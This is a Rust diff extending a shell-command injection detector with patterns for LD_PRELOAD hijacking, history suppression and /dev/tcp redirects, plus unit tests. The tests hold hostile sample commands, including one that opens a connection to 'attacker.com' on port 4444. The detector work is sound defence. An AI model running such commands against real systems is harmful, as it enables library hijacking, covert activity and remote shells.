@@ -137,6 +137,9 @@ pub enum InjectionReason {
     CrontabModify,
     DownloadExecute,
     ConfigFileAttack,
+    LdPreloadExploit,
+    HistfileSuppression,
+    ProcessSubstitutionRedirect,
 }
 
 impl InjectionReason {
@@ -151,6 +154,9 @@ impl InjectionReason {
             InjectionReason::CrontabModify => tr.inject_crontab_modify,
             InjectionReason::DownloadExecute => tr.inject_download_execute,
             InjectionReason::ConfigFileAttack => tr.inject_config_file_attack,
+            InjectionReason::LdPreloadExploit => tr.inject_ld_preload,
+            InjectionReason::HistfileSuppression => tr.inject_histfile_suppression,
+            InjectionReason::ProcessSubstitutionRedirect => tr.inject_proc_subst_redirect,
         }
     }
 }
@@ -208,6 +214,15 @@ fn compiled_injection_patterns() -> &'static CompiledInjectionPatterns {
                 InjectionReason::DownloadExecute,
             ),
             (r#"curl\s+.*-K"#, InjectionReason::ConfigFileAttack),
+            (r#"LD_PRELOAD\s*=\s*\S+"#, InjectionReason::LdPreloadExploit),
+            (
+                r#"HISTFILE\s*=\s*/dev/null"#,
+                InjectionReason::HistfileSuppression,
+            ),
+            (
+                r#"\d+<>\s*/dev/tcp/"#,
+                InjectionReason::ProcessSubstitutionRedirect,
+            ),
         ];
 
         let patterns = suspicious
@@ -624,6 +639,21 @@ mod tests {
             detect_danger_regex("find . -name '*.bak' -exec rm {} +"),
             DangerLevel::Warning
         );
+    }
+
+    #[test]
+    fn injection_ld_preload() {
+        assert!(detect_injection("LD_PRELOAD=/tmp/evil.so /usr/bin/passwd").is_some());
+    }
+
+    #[test]
+    fn injection_histfile_suppression() {
+        assert!(detect_injection("HISTFILE=/dev/null bash").is_some());
+    }
+
+    #[test]
+    fn injection_proc_subst_redirect() {
+        assert!(detect_injection("exec 3<>/dev/tcp/attacker.com/4444").is_some());
     }
 
     #[test]
